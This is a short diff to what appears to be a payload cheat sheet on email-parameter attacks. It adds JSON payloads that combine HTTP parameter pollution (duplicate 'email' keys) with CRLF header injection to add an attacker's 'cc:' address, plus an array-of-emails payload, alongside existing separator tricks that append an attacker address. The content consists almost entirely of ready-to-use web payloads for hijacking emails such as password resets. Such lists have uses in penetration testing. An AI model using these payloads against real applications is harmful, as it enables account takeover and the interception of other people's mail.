@@ -53,3 +53,13 @@ email=victim@gmail.com,attacker@gmail.com
 email=victim@gmail.com|attacker@gmail.com
 email=victim@gmail.com%20attacker@gmail.com
 ```
+
+## HPP chain with Bypass the mail() function protection against email header injection
+```
+{"email":"Victim@mail.com\r\n \ncc: Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email":"Victim@mail.com\r\n \ncc: Attacker@mail.com"}
+```
+## Array of emails
+```
+{"email":["victim@mail.com","attacker@mail.com"]}
+```
